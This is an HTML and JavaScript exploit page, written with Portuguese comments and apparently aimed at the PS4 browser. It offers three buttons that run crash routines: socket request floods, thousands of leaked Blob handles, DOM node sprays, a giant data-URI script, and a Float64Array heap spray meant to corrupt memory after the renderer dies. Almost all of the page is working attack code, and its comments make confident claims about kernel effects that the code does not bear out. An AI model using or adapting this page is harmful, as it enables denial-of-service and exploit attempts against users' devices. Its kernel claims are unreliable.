<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v290000: Zombie Apocalypse</title>
<style>
    body { background: #222; color: #0f0; font-family: monospace; text-align: center; padding: 15px; }
    h1 { border-bottom: 2px solid #0f0; color: #fff; }
    .status { 
        border: 2px solid #fff; padding: 15px; margin-bottom: 20px; 
        font-size: 1.1em; background: #000; color: #ff0; font-weight: bold;
    }
    
    button {
        display: block; width: 100%; padding: 25px; margin: 15px 0;
        background: #050; color: #fff; border: 2px solid #0f0;
        font-size: 20px; font-weight: bold; cursor: pointer; text-transform: uppercase;
    }
    button:hover { background: #0f0; color: #000; }
    
    #stage { background: #000; height: 50px; border: 1px solid #555; margin-top: 20px; }
</style>
</head>
<body>

<h1>v290000: ZOMBIE APOCALYPSE</h1>

<div class="status">
    ESTRATÉGIA: TRAVAR O NAVEGADOR (ZUMBI) + ESTOURAR O KERNEL<br>
    PASSO 1: CLIQUE<br>
    PASSO 2: FULLSCREEN (QUADRADO)<br>
    PASSO 3: FECHE O ALERTA (X)
</div>

<button onclick="zombie(z01)">01. White Screen Zombie + Socket Flood</button>

<button onclick="zombie(z02)">02. Black Screen Zombie + Blob Handle Leak</button>

<button onclick="zombie(z03)">03. The Hybrid (DOM Spray + Socket Bomb)</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');
    
    // VARIÁVEIS GLOBAIS PARA MANTER RECURSOS VIVOS NO KERNEL
    const kernel_handles = [];

    // =================================================================
    // CARGAS DE KERNEL (TOXIC PAYLOADS)
    // =================================================================
    
    // Cria milhares de descritores de arquivo (Blobs)
    function payload_blobs() {
        try {
            const data = new Uint8Array(1024).fill(0xCC);
            for(let i=0; i<5000; i++) {
                // Criação de URL de Blob gera uma entrada na tabela de arquivos do Kernel
                kernel_handles.push(URL.createObjectURL(new Blob([data])));
            }
        } catch(e){}
    }

    // Cria milhares de conexões (Sockets)
    // O Kernel precisa gerenciar o estado TCP/IP de cada uma
    function payload_sockets() {
        try {
            for(let i=0; i<200; i++) {
                const x = new XMLHttpRequest();
                // Abre conexão local (rápido e gera syscall)
                x.open("GET", "/", true);
                x.send();
                kernel_handles.push(x);
            }
        } catch(e){}
    }

    // =================================================================
    // EXECUTOR ZUMBI
    // =================================================================
    function zombie(vectorFunc) {
        Stage.innerHTML = "";
        kernel_handles.length = 0; // Limpa handles anteriores
        
        // 1. Configura o vetor de travamento
        const target = vectorFunc(Stage);
        
        // 2. Solicita Fullscreen
        if (target.webkitRequestFullscreen) target.webkitRequestFullscreen();
        else if (target.requestFullscreen) target.requestFullscreen();

        // 3. Timing de Detonação
        requestAnimationFrame(() => {
            setTimeout(() => {
                // INJETAR CARGA NO KERNEL AGORA
                // O navegador está prestes a travar. Enchemos a mão dele de "granadas".
                if(target._payload) target._payload();

                // TRAVA A THREAD (UI)
                window.alert("⚠️ PREPARAR PARA O TRAVAMENTO ⚠️\n\n1. O navegador vai congelar.\n2. O Kernel tentará limpar os recursos.\n3. Se der certo = Shutdown.");

                // DETONAÇÃO (CRASH DO RENDERIZADOR)
                if(target._detonate) {
                    target._detonate();
                    
                    // Tenta corromper a memória heap imediatamente após a morte
                    // Usando o spray de Float64 que funcionou bem nos testes de browser modernos
                    const spray = [];
                    for(let i=0; i<10000; i++) spray.push(new Float64Array(10));
                }
            }, 50);
        });
    }

    // =================================================================
    // 01. White Screen Zombie + Socket Flood
    // Baseado no "Script Loader Nuke" (Antigo Teste 3 da v28)
    // =================================================================
    function z01(stage) {
        const d = document.createElement('div');
        d.innerText = "SOCKET ZOMBIE";
        stage.appendChild(d);

        let s = null;

        d._payload = () => {
            // Abre centenas de conexões de rede antes de morrer
            payload_sockets();
        };

        d._detonate = () => {
            // Lógica original do Teste 3 (Script Loader Nuke)
            s = document.createElement('script');
            s.src = "data:text/javascript," + "A".repeat(50000); // Aumentei o tamanho
            document.body.appendChild(s);
            
            // Nuke
            s.remove();
            d.remove();
            document.open();
            document.write("DEAD");
            document.close();
        };
        return d;
    }

    // =================================================================
    // 02. Black Screen Zombie + Blob Handle Leak
    // Baseado no "Huge DOM Spray" (Antigo Teste 4 da v28)
    // =================================================================
    function z02(stage) {
        const d = document.createElement('div');
        d.innerText = "BLOB ZOMBIE";
        stage.appendChild(d);

        d._payload = () => {
            // Cria milhares de arquivos virtuais antes de morrer
            payload_blobs();
        };

        d._detonate = () => {
            // Lógica original do Teste 4 (DOM Spray)
            d.remove();
            
            // Spray massivo de nós DOM para travar o renderizador
            const frag = document.createDocumentFragment();
            for(let i=0; i<15000; i++) { // Aumentei a carga
                const s = document.createElement('span');
                s.innerText = "X";
                frag.appendChild(s);
            }
            document.body.appendChild(frag);
            
            // Morte Súbita
            document.body.innerHTML = "";
        };
        return d;
    }

    // =================================================================
    // 03. The Hybrid
    // Mistura o DOM Spray (Tela Preta) com Sockets
    // =================================================================
    function z03(stage) {
        const d = document.createElement('div');
        d.innerText = "HYBRID ZOMBIE";
        stage.appendChild(d);

        d._payload = () => {
            payload_sockets();
        };

        d._detonate = () => {
            // Usa o DOM Spray para garantir o travamento (Black Screen)
            const frag = document.createDocumentFragment();
            for(let i=0; i<10000; i++) {
                const s = document.createElement('div');
                s.style.position = "fixed"; 
                s.style.top = i + "px"; // Força cálculo de layout complexo
                frag.appendChild(s);
            }
            document.body.appendChild(frag);
            
            // Nuke
            document.body.innerHTML = "";
        };
        return d;
    }

</script>
</body>
</html>
